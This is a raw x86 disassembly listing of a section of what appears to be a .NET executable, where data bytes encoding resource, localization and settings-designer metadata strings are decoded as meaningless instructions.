  40b92c:	add    BYTE PTR [eax+eax*1+0x6f],cl
  40b930:	add    BYTE PTR [ebx+0x0],ah
  40b933:	popa   
  40b934:	add    BYTE PTR [eax+eax*1+0x69],ch
  40b938:	add    BYTE PTR [edx+0x0],bh
  40b93b:	popa   
  40b93c:	add    BYTE PTR [eax+eax*1+0x69],dh
  40b940:	add    BYTE PTR [edi+0x0],ch
  40b943:	outs   dx,BYTE PTR ds:[esi]
  40b944:	add    BYTE PTR [eax],al
  40b946:	and    DWORD PTR [ebx+0x0],eax
  40b949:	jne    0x40b94b
  40b94b:	jb     0x40b94d
  40b94d:	jb     0x40b94f
  40b94f:	add    BYTE PTR gs:[esi+0x0],ch
  40b953:	je     0x40b955
  40b955:	push   ebp
  40b956:	add    BYTE PTR [ecx+0x0],cl
  40b959:	inc    ebx
  40b95a:	add    BYTE PTR [ebp+0x0],dh
  40b95d:	ins    BYTE PTR es:[edi],dx
  40b95e:	add    BYTE PTR [eax+eax*1+0x75],dh
  40b962:	add    BYTE PTR [edx+0x0],dh
  40b965:	add    BYTE PTR gs:[eax],al
  40b968:	add    DWORD PTR [eax],eax
  40b96a:	add    ebx,DWORD PTR [eax+eax*1+0x0]
  40b96e:	or     ebp,DWORD PTR [edx]
  40b970:	add    BYTE PTR [esi],ch
  40b972:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40b976:	add    BYTE PTR [eax+eax*1+0x0],ch
  40b97a:	or     DWORD PTR [esi],ebp
  40b97c:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40b980:	add    BYTE PTR [eax+eax*1+0x0],ch
  40b984:	adc    eax,0x650052
  40b989:	add    BYTE PTR fs:[ecx+0x0],ch
  40b98d:	jae    0x40b98f
  40b98f:	je     0x40b991
  40b991:	dec    esp
  40b992:	add    BYTE PTR [ecx+0x0],ch
  40b995:	jae    0x40b997
  40b997:	je     0x40b999
  40b999:	add    BYTE PTR [ebx],ah
  40b99b:	inc    esi
  40b99c:	add    BYTE PTR [edx+0x0],dh
  40b99f:	popa   
  40b9a0:	add    BYTE PTR [ebp+0x0],ch
  40b9a3:	add    BYTE PTR gs:[edi+0x0],dh
  40b9a7:	outs   dx,DWORD PTR ds:[esi]
  40b9a8:	add    BYTE PTR [edx+0x0],dh
  40b9ab:	imul   eax,DWORD PTR [eax],0x4c
  40b9ae:	add    BYTE PTR [ecx+0x0],ch
  40b9b1:	jae    0x40b9b3
  40b9b3:	je     0x40b9b5
  40b9b5:	add    BYTE PTR cs:[eax+0x0],bh
  40b9b9:	ins    DWORD PTR es:[edi],dx
  40b9ba:	add    BYTE PTR [eax+eax*1+0x0],ch
  40b9be:	sbb    eax,DWORD PTR [ecx+0x0]
  40b9c1:	jae    0x40b9c3
  40b9c3:	jae    0x40b9c5
  40b9c5:	add    BYTE PTR gs:[ebp+0x0],ch
  40b9c9:	bound  eax,QWORD PTR [eax]
  40b9cb:	ins    BYTE PTR es:[edi],dx
  40b9cc:	add    BYTE PTR [ecx+0x0],bh
  40b9cf:	pop    esp
  40b9d0:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40b9d4:	add    BYTE PTR [ebx],dh
  40b9d6:	add    BYTE PTR [eax+eax*1+0x0],bl
  40b9da:	and    eax,0x730061
  40b9df:	jae    0x40b9e1
  40b9e1:	add    BYTE PTR gs:[ebp+0x0],ch
  40b9e5:	bound  eax,QWORD PTR [eax]
  40b9e7:	ins    BYTE PTR es:[edi],dx
  40b9e8:	add    BYTE PTR [ecx+0x0],bh
  40b9eb:	push   esp
  40b9ec:	add    BYTE PTR [ecx+0x0],ah
  40b9ef:	bound  eax,QWORD PTR [eax]
  40b9f1:	ins    BYTE PTR es:[edi],dx
  40b9f2:	add    BYTE PTR [ebp+0x0],ah
  40b9f5:	dec    ecx
  40b9f6:	add    BYTE PTR [esi+0x0],ch
  40b9f9:	data16 add BYTE PTR [edi+0x0],ch
  40b9fd:	jae    0x40b9ff
  40b9ff:	add    BYTE PTR [ebx],bh
  40ba01:	dec    ebp
  40ba02:	add    BYTE PTR [ecx+0x0],ch
  40ba05:	arpl   WORD PTR [eax],ax
  40ba07:	jb     0x40ba09
  40ba09:	outs   dx,DWORD PTR ds:[esi]
  40ba0a:	add    BYTE PTR [ebx+0x0],dh
  40ba0d:	outs   dx,DWORD PTR ds:[esi]
  40ba0e:	add    BYTE PTR [esi+0x0],ah
  40ba11:	je     0x40ba13
  40ba13:	sub    eax,0x69005700
  40ba18:	add    BYTE PTR [esi+0x0],ch
  40ba1b:	add    BYTE PTR fs:[edi+0x0],ch
  40ba1f:	ja     0x40ba21
  40ba21:	jae    0x40ba23
  40ba23:	sub    eax,0x4c004300
  40ba28:	add    BYTE PTR [edx+0x0],dl
  40ba2b:	inc    ebx
  40ba2c:	add    BYTE PTR [edi+0x0],ch
  40ba2f:	jb     0x40ba31
  40ba31:	add    BYTE PTR gs:[ebx+0x0],al
  40ba35:	outs   dx,DWORD PTR ds:[esi]
  40ba36:	add    BYTE PTR [ebp+0x0],ch
  40ba39:	jo     0x40ba3b
  40ba3b:	add    DWORD PTR [ebx],ecx
  40ba3d:	sub    al,BYTE PTR [eax]
  40ba3f:	add    BYTE PTR cs:[eax+0x0],bh
  40ba43:	ins    DWORD PTR es:[edi],dx
  40ba44:	add    BYTE PTR [eax+eax*1+0x0],ch
  40ba48:	sbb    eax,0x730061
  40ba4d:	jae    0x40ba4f
  40ba4f:	add    BYTE PTR gs:[ebp+0x0],ch
  40ba53:	bound  eax,QWORD PTR [eax]
  40ba55:	ins    BYTE PTR es:[edi],dx
  40ba56:	add    BYTE PTR [ecx+0x0],bh
  40ba59:	push   esp
  40ba5a:	add    BYTE PTR [ecx+0x0],ah
  40ba5d:	bound  eax,QWORD PTR [eax]
  40ba5f:	ins    BYTE PTR es:[edi],dx
  40ba60:	add    BYTE PTR [ebp+0x0],ah
  40ba63:	jae    0x40ba65
  40ba65:	add    BYTE PTR [ecx],bl
  40ba67:	popa   
  40ba68:	add    BYTE PTR [ebx+0x0],dh
  40ba6b:	jae    0x40ba6d
  40ba6d:	add    BYTE PTR gs:[ebp+0x0],ch
  40ba71:	bound  eax,QWORD PTR [eax]
  40ba73:	ins    BYTE PTR es:[edi],dx
  40ba74:	add    BYTE PTR [ecx+0x0],bh
  40ba77:	dec    esi
  40ba78:	add    BYTE PTR [ecx+0x0],ah
  40ba7b:	ins    DWORD PTR es:[edi],dx
  40ba7c:	add    BYTE PTR [ebp+0x0],ah
  40ba7f:	add    BYTE PTR [ebx],al
  40ba81:	sub    al,0x0
  40ba83:	add    BYTE PTR [ecx],dl
  40ba85:	inc    esi
  40ba86:	add    BYTE PTR [ecx+0x0],ch
  40ba89:	ins    BYTE PTR es:[edi],dx
  40ba8a:	add    BYTE PTR [ebp+0x0],ah
  40ba8d:	dec    esp
  40ba8e:	add    BYTE PTR [ecx+0x0],ch
  40ba91:	jae    0x40ba93
  40ba93:	je     0x40ba95
  40ba95:	add    BYTE PTR ds:0x650052,cl
  40ba9b:	add    BYTE PTR fs:[ecx+0x0],ch
  40ba9f:	jae    0x40baa1
  40baa1:	je     0x40baa3
  40baa3:	add    BYTE PTR [ecx],cl
  40baa5:	inc    esi
  40baa6:	add    BYTE PTR [ecx+0x0],ch
  40baa9:	ins    BYTE PTR es:[edi],dx
  40baaa:	add    BYTE PTR [ebp+0x0],ah
  40baad:	add    BYTE PTR [ecx],bl
  40baaf:	inc    ecx
  40bab0:	add    BYTE PTR [ebx+0x0],dh
  40bab3:	jae    0x40bab5
  40bab5:	add    BYTE PTR gs:[ebp+0x0],ch
  40bab9:	bound  eax,QWORD PTR [eax]
  40babb:	ins    BYTE PTR es:[edi],dx
  40babc:	add    BYTE PTR [ecx+0x0],bh
  40babf:	dec    esi
  40bac0:	add    BYTE PTR [ecx+0x0],ah
  40bac3:	ins    DWORD PTR es:[edi],dx
  40bac4:	add    BYTE PTR [ebp+0x0],ah
  40bac7:	add    BYTE PTR [edi],cl
  40bac9:	push   esi
  40baca:	add    BYTE PTR [ebp+0x0],ah
  40bacd:	jb     0x40bacf
  40bacf:	jae    0x40bad1
  40bad1:	imul   eax,DWORD PTR [eax],0x6e006f
  40bad7:	add    BYTE PTR ds:0x750050,bl
  40badd:	bound  eax,QWORD PTR [eax]
  40badf:	ins    BYTE PTR es:[edi],dx
  40bae0:	add    BYTE PTR [ecx+0x0],ch
  40bae3:	arpl   WORD PTR [eax],ax
  40bae5:	dec    ebx
  40bae6:	add    BYTE PTR [ebp+0x0],ah
  40bae9:	jns    0x40baeb
  40baeb:	push   esp
  40baec:	add    BYTE PTR [edi+0x0],ch
  40baef:	imul   eax,DWORD PTR [eax],0x65
  40baf2:	add    BYTE PTR [esi+0x0],ch
  40baf5:	add    BYTE PTR [edi],cl
  40baf7:	inc    ebx
  40baf8:	add    BYTE PTR [ebp+0x0],dh
  40bafb:	ins    BYTE PTR es:[edi],dx
  40bafc:	add    BYTE PTR [eax+eax*1+0x75],dh
  40bb00:	add    BYTE PTR [edx+0x0],dh
  40bb03:	add    BYTE PTR gs:[eax],al
  40bb06:	or     ecx,DWORD PTR [ecx+0x0]
  40bb09:	outs   dx,BYTE PTR ds:[esi]
  40bb0a:	add    BYTE PTR [edi+0x0],al
  40bb0d:	inc    ecx
  40bb0e:	add    BYTE PTR [ebx+0x0],al
  40bb11:	add    BYTE PTR [ecx],bl
  40bb13:	dec    ecx
  40bb14:	add    BYTE PTR [ebx+0x0],dh
  40bb17:	push   edx
  40bb18:	add    BYTE PTR [ebp+0x0],ah
  40bb1b:	add    BYTE PTR fs:[ecx+0x0],ch
  40bb1f:	jae    0x40bb21
  40bb21:	je     0x40bb23
  40bb23:	push   edx
  40bb24:	add    BYTE PTR [edi+0x0],ch
  40bb27:	outs   dx,DWORD PTR ds:[esi]
  40bb28:	add    BYTE PTR [eax+eax*1+0x0],dh
  40bb2c:	arpl   WORD PTR [ebx+0x0],di
  40bb2f:	xor    BYTE PTR [eax],al
  40bb31:	jge    0x40bb33
  40bb33:	sub    al,0x0
  40bb35:	and    BYTE PTR [eax],al
  40bb37:	push   esi
  40bb38:	add    BYTE PTR [ebp+0x0],ah
  40bb3b:	jb     0x40bb3d
  40bb3d:	jae    0x40bb3f
  40bb3f:	imul   eax,DWORD PTR [eax],0x6e006f
  40bb45:	cmp    eax,0x31007b00
  40bb4a:	add    BYTE PTR [ebp+0x0],bh
  40bb4d:	sub    al,0x0
  40bb4f:	and    BYTE PTR [eax],al
  40bb51:	inc    ebx
  40bb52:	add    BYTE PTR [ebp+0x0],dh
  40bb55:	ins    BYTE PTR es:[edi],dx
  40bb56:	add    BYTE PTR [eax+eax*1+0x75],dh
  40bb5a:	add    BYTE PTR [edx+0x0],dh
  40bb5d:	add    BYTE PTR gs:0x32007b00,bh
  40bb64:	add    BYTE PTR [ebp+0x0],bh
  40bb67:	sub    al,0x0
  40bb69:	and    BYTE PTR [eax],al
  40bb6b:	push   eax
  40bb6c:	add    BYTE PTR [ebp+0x0],dh
  40bb6f:	bound  eax,QWORD PTR [eax]
  40bb71:	ins    BYTE PTR es:[edi],dx
  40bb72:	add    BYTE PTR [ecx+0x0],ch
  40bb75:	arpl   WORD PTR [eax],ax
  40bb77:	dec    ebx
  40bb78:	add    BYTE PTR [ebp+0x0],ah
  40bb7b:	jns    0x40bb7d
  40bb7d:	push   esp
  40bb7e:	add    BYTE PTR [edi+0x0],ch
  40bb81:	imul   eax,DWORD PTR [eax],0x65
  40bb84:	add    BYTE PTR [esi+0x0],ch
  40bb87:	cmp    eax,0x33007b00
  40bb8c:	add    BYTE PTR [ebp+0x0],bh
  40bb8f:	add    BYTE PTR [ecx],cl
  40bb91:	bound  eax,QWORD PTR [eax]
  40bb93:	imul   eax,DWORD PTR [eax],0x5c006e
  40bb99:	add    BYTE PTR [ebx],al
  40bb9b:	das    
  40bb9c:	add    BYTE PTR [eax],al
  40bb9e:	and    eax,DWORD PTR [ebp+0x0]
  40bba1:	outs   dx,BYTE PTR ds:[esi]
  40bba2:	add    BYTE PTR [ebx+0x0],dh
  40bba5:	jne    0x40bba7
  40bba7:	jb     0x40bba9
  40bba9:	add    BYTE PTR gs:[eax+0x0],cl
  40bbad:	outs   dx,DWORD PTR ds:[esi]
  40bbae:	add    BYTE PTR [ebx+0x0],dh
  40bbb1:	je     0x40bbb3
  40bbb3:	inc    ebx
  40bbb4:	add    BYTE PTR [edx+0x0],dh
  40bbb7:	add    BYTE PTR gs:[ecx+0x0],ah
  40bbbb:	je     0x40bbbd
  40bbbd:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  40bbc2:	cmovne eax,DWORD PTR [eax]
  40bbc5:	js     0x40bbc7
  40bbc7:	add    BYTE PTR gs:[ebx+0x0],ah
  40bbcb:	jne    0x40bbcd
  40bbcd:	je     0x40bbcf
  40bbcf:	add    BYTE PTR gs:[eax],al
  40bbd2:	and    eax,0x73005f
  40bbd7:	push   0x64006100
  40bbdc:	add    BYTE PTR [edi+0x0],ch
  40bbdf:	ja     0x40bbe1
  40bbe1:	pop    edi
  40bbe2:	add    BYTE PTR [ecx+0x0],ah
  40bbe5:	jae    0x40bbe7
  40bbe7:	jae    0x40bbe9
  40bbe9:	add    BYTE PTR gs:[ebp+0x0],ch
  40bbed:	bound  eax,QWORD PTR [eax]
  40bbef:	ins    BYTE PTR es:[edi],dx
  40bbf0:	add    BYTE PTR [ecx+0x0],ch
  40bbf3:	add    BYTE PTR gs:[ebx+0x0],dh
  40bbf7:	add    BYTE PTR [eax+0x790053a7],al
  40bbfd:	add    BYTE PTR [ebx+0x0],dh
  40bc00:	je     0x40bc02
  40bc02:	add    BYTE PTR gs:[ebp+0x0],ch
  40bc06:	add    BYTE PTR cs:[edi+0x0],dl
  40bc0a:	add    BYTE PTR gs:[edx+0x0],ah
  40bc0e:	add    BYTE PTR cs:[ebx+0x0],al
  40bc12:	outs   dx,DWORD PTR ds:[esi]
  40bc13:	add    BYTE PTR [ebp+0x0],ch
  40bc16:	jo     0x40bc18
  40bc18:	imul   eax,DWORD PTR [eax],0x61006c
  40bc1e:	je     0x40bc20
  40bc20:	imul   eax,DWORD PTR [eax],0x6e006f
  40bc26:	add    BYTE PTR cs:[edx+0x0],al
  40bc2a:	jne    0x40bc2c
  40bc2c:	imul   eax,DWORD PTR [eax],0x64006c
  40bc32:	dec    ebp
  40bc33:	add    BYTE PTR [ecx+0x0],ah
  40bc36:	outs   dx,BYTE PTR ds:[esi]
  40bc37:	add    BYTE PTR [ecx+0x0],ah
  40bc3a:	add    BYTE PTR [di+0x0],ah
  40bc3e:	jb     0x40bc40
  40bc40:	dec    eax
  40bc41:	add    BYTE PTR [edi+0x0],ch
  40bc44:	jae    0x40bc46
  40bc46:	je     0x40bc48
  40bc48:	sub    eax,DWORD PTR [eax]
  40bc4a:	inc    ebx
  40bc4b:	add    BYTE PTR [eax+eax*1+0x69],ch
  40bc4f:	add    BYTE PTR [ebp+0x0],ah
  40bc52:	outs   dx,BYTE PTR ds:[esi]
  40bc53:	add    BYTE PTR [eax+eax*1+0x56],dh
  40bc57:	add    BYTE PTR [ecx+0x0],ch
  40bc5a:	jb     0x40bc5c
  40bc5c:	je     0x40bc5e
  40bc5e:	jne    0x40bc60
  40bc60:	popa   
  40bc61:	add    BYTE PTR [eax+eax*1+0x50],ch
  40bc65:	add    BYTE PTR [ecx+0x0],ah
  40bc68:	je     0x40bc6a
  40bc6a:	push   0x72005000
  40bc6f:	add    BYTE PTR [edi+0x0],ch
  40bc72:	jbe    0x40bc74
  40bc74:	imul   eax,DWORD PTR [eax],0x650064
  40bc7a:	jb     0x40bc7c
  40bc7c:	sub    eax,DWORD PTR [eax]
  40bc7e:	inc    ebx
  40bc7f:	add    BYTE PTR [eax+eax*1+0x69],ch
  40bc83:	add    BYTE PTR [ebp+0x0],ah
  40bc86:	outs   dx,BYTE PTR ds:[esi]
  40bc87:	add    BYTE PTR [eax+eax*1+0x56],dh
  40bc8b:	add    BYTE PTR [ecx+0x0],ch
  40bc8e:	jb     0x40bc90
  40bc90:	je     0x40bc92
  40bc92:	jne    0x40bc94
  40bc94:	popa   
  40bc95:	add    BYTE PTR [eax+eax*1+0x46],ch
  40bc99:	add    BYTE PTR [ecx+0x0],ch
  40bc9c:	ins    BYTE PTR es:[edi],dx
  40bc9d:	add    BYTE PTR [ebp+0x0],ah
  40bca0:	add    BYTE PTR [eax],al
  40bca2:	add    BYTE PTR [eax],al
  40bca4:	in     eax,0xc7
  40bca6:	xor    ecx,ebx
  40bca8:	jne    0x40bce8
  40bcaa:	sub    al,BYTE PTR [ecx-0x47]
  40bcad:	or     BYTE PTR [ebp+0xc758dda],ch
  40bcb3:	xchg   esp,eax
  40bcb4:	add    BYTE PTR [eax],cl
  40bcb6:	mov    bh,0x7a
  40bcb8:	pop    esp
  40bcb9:	push   esi
  40bcba:	sbb    DWORD PTR [eax+eiz*8],esi
  40bcbd:	mov    DWORD PTR [eax],ecx
  40bcbf:	mov    al,0x3f
  40bcc1:	pop    edi
  40bcc2:	jg     0x40bcd5
  40bcc4:	aad    0xa
  40bcc6:	cmp    al,BYTE PTR [ebx]
  40bcc8:	push   es
  40bcc9:	adc    bl,BYTE PTR [ebp+0x3]
  40bccc:	push   es
  40bccd:	adc    ah,BYTE PTR [ecx+0x3]
  40bcd0:	add    BYTE PTR [eax],al
  40bcd2:	add    al,BYTE PTR [eax+eax*1]
  40bcd5:	add    DWORD PTR [ecx],eax
  40bcd7:	add    al,BYTE PTR [edx]
  40bcd9:	push   es
  40bcda:	sbb    al,0x5
  40bcdc:	add    BYTE PTR [ecx],al
  40bcde:	or     BYTE PTR ds:0x30e,bl
  40bce4:	add    DWORD PTR [ecx],ecx
  40bce6:	add    BYTE PTR [ebx],al
  40bce8:	add    DWORD PTR [edx],edx
  40bcea:	adc    dl,BYTE PTR gs:0x20036912
  40bcf1:	add    BYTE PTR [ecx],al
  40bcf3:	add    al,BYTE PTR [esi]
  40bcf5:	add    al,BYTE PTR [ebx]
  40bcf7:	or     BYTE PTR [eax],al
  40bcf9:	add    al,BYTE PTR [ebx]
  40bcfb:	push   es
  40bcfc:	adc    ch,BYTE PTR [ebp+0x5]
  40bcff:	and    BYTE PTR [ecx],al
  40bd01:	add    DWORD PTR [edx],edx
  40bd03:	ins    DWORD PTR es:[edi],dx
  40bd04:	pop    es
  40bd05:	and    BYTE PTR [edx],al
  40bd07:	sbb    al,0x12
  40bd09:	jno    0x40bd1d
  40bd0b:	jne    0x40bd12
  40bd0d:	and    BYTE PTR [ecx],al
  40bd0f:	sbb    al,0x12
  40bd11:	jno    0x40bd19
  40bd13:	and    BYTE PTR [edx],al
  40bd15:	add    DWORD PTR [edx],edx
  40bd17:	jno    0x40bd35
  40bd19:	pop    es
  40bd1a:	and    BYTE PTR [edx],al
  40bd1c:	add    DWORD PTR [edx],edx
  40bd1e:	jns    0x40bd32
  40bd20:	jge    0x40bd2a
  40bd22:	and    BYTE PTR [edx],al
  40bd24:	add    DWORD PTR [edx],edx
  40bd26:	jns    0x40bd3a
  40bd28:	add    BYTE PTR [ecx+0x1022008],0x12
  40bd2f:	jns    0x40bd43
  40bd31:	add    BYTE PTR [ebp+0x1012005],0x12
  40bd38:	jns    0x40bd3c
  40bd3a:	push   es
  40bd3b:	push   cs
  40bd3c:	sbb    al,0x43
  40bd3e:	add    BYTE PTR [ebp+0x0],dh
  40bd41:	jb     0x40bd43
  40bd43:	jb     0x40bd45
  40bd45:	add    BYTE PTR gs:[esi+0x0],ch
  40bd49:	je     0x40bd4b
  40bd4b:	inc    ebx
  40bd4c:	add    BYTE PTR [ebp+0x0],dh
  40bd4f:	ins    BYTE PTR es:[edi],dx
  40bd50:	add    BYTE PTR [eax+eax*1+0x75],dh
  40bd54:	add    BYTE PTR [edx+0x0],dh
  40bd57:	add    BYTE PTR gs:[eax],ah
  40bd5a:	inc    ebx
  40bd5b:	add    BYTE PTR [ebp+0x0],dh
  40bd5e:	jb     0x40bd60
  40bd60:	jb     0x40bd62
  40bd62:	add    BYTE PTR gs:[esi+0x0],ch
  40bd66:	je     0x40bd68
  40bd68:	push   ebp
  40bd69:	add    BYTE PTR [ecx+0x0],cl
  40bd6c:	inc    ebx
  40bd6d:	add    BYTE PTR [ebp+0x0],dh
  40bd70:	ins    BYTE PTR es:[edi],dx
  40bd71:	add    BYTE PTR [eax+eax*1+0x75],dh
  40bd75:	add    BYTE PTR [edx+0x0],dh
  40bd78:	add    BYTE PTR gs:[eax+0x74006898],al
  40bd7f:	add    BYTE PTR [eax+eax*1+0x70],dh
  40bd83:	add    BYTE PTR [edx],bh
  40bd85:	add    BYTE PTR [edi],ch
  40bd87:	add    BYTE PTR [edi],ch
  40bd89:	add    BYTE PTR [ebx+0x0],dh
  40bd8c:	arpl   WORD PTR [eax],ax
  40bd8e:	push   0x6d006500
  40bd93:	add    BYTE PTR [ecx+0x0],ah
  40bd96:	jae    0x40bd98
  40bd98:	add    BYTE PTR cs:[ebp+0x0],ch
  40bd9c:	imul   eax,DWORD PTR [eax],0x720063
  40bda2:	outs   dx,DWORD PTR ds:[esi]
  40bda3:	add    BYTE PTR [ebx+0x0],dh
  40bda6:	outs   dx,DWORD PTR ds:[esi]
  40bda7:	add    BYTE PTR [esi+0x0],ah
  40bdaa:	je     0x40bdac
  40bdac:	add    BYTE PTR cs:[ebx+0x0],ah
  40bdb0:	outs   dx,DWORD PTR ds:[esi]
  40bdb1:	add    BYTE PTR [ebp+0x0],ch
  40bdb4:	das    
  40bdb5:	add    BYTE PTR [esi+0x0],dl
  40bdb8:	imul   eax,DWORD PTR [eax],0x750073
  40bdbe:	popa   
  40bdbf:	add    BYTE PTR [eax+eax*1+0x53],ch
  40bdc3:	add    BYTE PTR [eax+eax*1+0x75],dh
  40bdc7:	add    BYTE PTR [eax+eax*1+0x69],ah
  40bdcb:	add    BYTE PTR [edi+0x0],ch
  40bdce:	das    
  40bdcf:	add    BYTE PTR [edx],dh
  40bdd1:	add    BYTE PTR [eax],dh
  40bdd3:	add    BYTE PTR [ecx],dh
  40bdd5:	add    BYTE PTR [ecx],dh
  40bdd7:	add    BYTE PTR [edi],ch
  40bdd9:	add    BYTE PTR [edi+0x0],dl
  40bddc:	add    BYTE PTR gs:[edx+0x0],ah
  40bde0:	push   eax
  40bde1:	add    BYTE PTR [eax+eax*1+0x61],ch
  40bde5:	add    BYTE PTR [eax+eax*1+0x66],dh
  40bde9:	add    BYTE PTR [edi+0x0],ch
  40bdec:	jb     0x40bdee
  40bdee:	ins    DWORD PTR es:[edi],dx
  40bdef:	add    BYTE PTR [eax+eax*1+0x6f],dl
  40bdf3:	add    BYTE PTR [edi+0x0],ch
  40bdf6:	ins    BYTE PTR es:[edi],dx
  40bdf7:	add    BYTE PTR [ebx+0x0],dh
  40bdfa:	das    
  40bdfb:	add    BYTE PTR [eax+eax*1+0x6f],cl
  40bdff:	add    BYTE PTR [ebx+0x0],ah
  40be02:	popa   
  40be03:	add    BYTE PTR [eax+eax*1+0x69],ch
  40be07:	add    BYTE PTR [edx+0x0],bh
  40be0a:	popa   
  40be0b:	add    BYTE PTR [eax+eax*1+0x69],dh
  40be0f:	add    BYTE PTR [edi+0x0],ch
  40be12:	outs   dx,BYTE PTR ds:[esi]
  40be13:	add    BYTE PTR [ebx],cl
  40be15:	and    BYTE PTR [ebx],al
  40be17:	sbb    al,0x10
  40be19:	adc    dh,BYTE PTR [ebp+0x12]
  40be1c:	or     BYTE PTR [ecx+0x20077112],0x2
  40be23:	add    DWORD PTR [eax],edx
  40be25:	adc    dh,BYTE PTR [ebp+0x1c]
  40be28:	add    al,0x6
  40be2a:	adc    al,BYTE PTR [eax+0x1106048d]
  40be30:	adc    BYTE PTR [ecx+0x1022007],0xe
  40be37:	adc    DWORD PTR [eax+0x1200691],eax
  40be3d:	add    dl,BYTE PTR [edx]
  40be3f:	adc    BYTE PTR [ebp+0x44120603],0x5
  40be46:	and    BYTE PTR [ecx],al
  40be48:	add    DWORD PTR [edx],edx
  40be4a:	inc    esp
  40be4b:	push   es
  40be4c:	and    BYTE PTR [ecx],al
  40be4e:	add    DWORD PTR [edx],edx
  40be50:	sbb    BYTE PTR [ecx+0x1012006],0x12
  40be57:	sbb    BYTE PTR [ebp+0x1012004],0xe
  40be5e:	push   es
  40be5f:	and    BYTE PTR [ecx],al
  40be61:	add    DWORD PTR [edx],edx
  40be63:	and    BYTE PTR [ecx+0x1022005],0xe
  40be6a:	push   cs
  40be6b:	or     ch,BYTE PTR [edx]
  40be6d:	add    BYTE PTR [esi],ch
  40be6f:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40be73:	add    BYTE PTR [eax+eax*1+0x8],ch
  40be77:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40be7c:	add    BYTE PTR [eax+eax*1+0x22],ch
  40be80:	inc    esi
  40be81:	add    BYTE PTR [edx+0x0],dh
  40be84:	popa   
  40be85:	add    BYTE PTR [ebp+0x0],ch
  40be88:	add    BYTE PTR gs:[edi+0x0],dh
  40be8c:	outs   dx,DWORD PTR ds:[esi]
  40be8d:	add    BYTE PTR [edx+0x0],dh
  40be90:	imul   eax,DWORD PTR [eax],0x4c
  40be93:	add    BYTE PTR [ecx+0x0],ch
  40be96:	jae    0x40be98
  40be98:	je     0x40be9a
  40be9a:	add    BYTE PTR cs:[eax+0x0],bh
  40be9e:	ins    DWORD PTR es:[edi],dx
  40be9f:	add    BYTE PTR [eax+eax*1+0x14],ch
  40bea3:	push   edx
  40bea4:	add    BYTE PTR [ebp+0x0],ah
  40bea7:	add    BYTE PTR fs:[ecx+0x0],ch
  40beab:	jae    0x40bead
  40bead:	je     0x40beaf
  40beaf:	dec    esp
  40beb0:	add    BYTE PTR [ecx+0x0],ch
  40beb3:	jae    0x40beb5
  40beb5:	je     0x40beb7
  40beb7:	or     esp,DWORD PTR [eax]
  40beb9:	add    DWORD PTR ds:0x1a58012,edx
  40bebf:	push   cs
  40bec0:	adc    al,BYTE PTR [eax+0x12009a9]
  40bec6:	add    dl,BYTE PTR ds:0x1a58012
  40becc:	push   cs
  40becd:	push   cs
  40bece:	and    BYTE PTR [ecx],al
  40bed0:	adc    eax,0x1a58012
  40bed5:	push   cs
  40bed6:	adc    eax,0x1a58012
  40bedb:	push   cs
  40bedc:	adc    BYTE PTR [eax],ah
  40bede:	add    dl,BYTE PTR ds:0x1a58012
  40bee4:	push   cs
  40bee5:	push   cs
  40bee6:	adc    eax,0x2ad8012
  40beeb:	push   cs
  40beec:	or     BYTE PTR [ecx],dl
  40beee:	and    BYTE PTR [ebx],al
  40bef0:	adc    eax,0x1a58012
  40bef5:	push   cs
  40bef6:	push   cs
  40bef7:	add    dl,BYTE PTR ds:0x2ad8012
  40befd:	push   cs
  40befe:	or     BYTE PTR [eax+eax*1],al
  40bf01:	add    DWORD PTR [esi],ecx
  40bf03:	push   cs
  40bf04:	or     BYTE PTR [eax],ah
  40bf06:	add    DWORD PTR [ecx],edx
  40bf08:	xor    BYTE PTR [ecx+0x4b58012],0x6
  40bf0f:	adc    al,BYTE PTR [eax+0x150608a9]
  40bf15:	adc    al,BYTE PTR [eax+0xe0e02b9]
  40bf1b:	push   cs
  40bf1c:	push   es
  40bf1d:	adc    eax,0x2b98012
  40bf22:	push   cs
  40bf23:	adc    eax,0x2b98012
  40bf28:	push   cs
  40bf29:	push   cs
  40bf2a:	add    eax,0x80120020
  40bf2f:	test   eax,0xe002003
  40bf34:	or     DWORD PTR [eax],esp
  40bf36:	add    BYTE PTR ds:0x2b98012,dl
  40bf3c:	push   cs
  40bf3d:	push   cs
  40bf3e:	add    esp,DWORD PTR [eax]
  40bf40:	add    BYTE PTR [edx],al
  40bf42:	add    al,0x20
  40bf44:	add    DWORD PTR [ecx],eax
  40bf46:	add    al,BYTE PTR [esi]
  40bf48:	and    BYTE PTR [ebx],al
  40bf4a:	add    DWORD PTR [esi],ecx
  40bf4c:	push   cs
  40bf4d:	push   cs
  40bf4e:	add    eax,0x12010120
  40bf53:	and    al,0x6
  40bf55:	and    BYTE PTR [ecx],al
  40bf57:	sbb    al,0x12
  40bf59:	cmp    BYTE PTR [ebp+0xe03200a],0x12
  40bf60:	add    cl,0xe
  40bf63:	adc    al,BYTE PTR [eax+0x12008a9]
  40bf69:	adc    al,BYTE PTR [eax-0x3e7fed3b]
  40bf6f:	add    eax,0x10080120
  40bf74:	push   cs
  40bf75:	or     al,0x20
  40bf77:	add    al,0x8
  40bf79:	sbb    eax,0x111d090e
  40bf7e:	or     cl,0x10
  40bf81:	or     DWORD PTR ds:0x1d080520,ecx
  40bf87:	push   cs
  40bf88:	or     DWORD PTR [edx],eax
  40bf8a:	sbb    eax,0x10c98011
  40bf8f:	or     DWORD PTR ds:0xe0e0220,eax
  40bf95:	push   cs
  40bf96:	or     DWORD PTR [eax],esp
  40bf98:	add    ecx,DWORD PTR [esi]
  40bf9a:	push   cs
  40bf9b:	push   cs
  40bf9c:	adc    BYTE PTR [ecx],dl
  40bf9e:	or     ch,0x4
  40bfa1:	and    BYTE PTR [ecx],al
  40bfa3:	push   cs
  40bfa4:	push   cs
  40bfa5:	pop    es
  40bfa6:	and    BYTE PTR [ebx],al
  40bfa8:	or     BYTE PTR [esi],cl
  40bfaa:	push   cs
  40bfab:	adc    BYTE PTR [edx],al
  40bfad:	pop    es
  40bfae:	and    BYTE PTR [ebx],al
  40bfb0:	or     BYTE PTR [esi],cl
  40bfb2:	push   cs
  40bfb3:	adc    BYTE PTR [esi],cl
  40bfb5:	or     esp,DWORD PTR [eax]
  40bfb7:	add    al,0x8
  40bfb9:	push   cs
  40bfba:	push   cs
  40bfbb:	adc    BYTE PTR [esi],cl
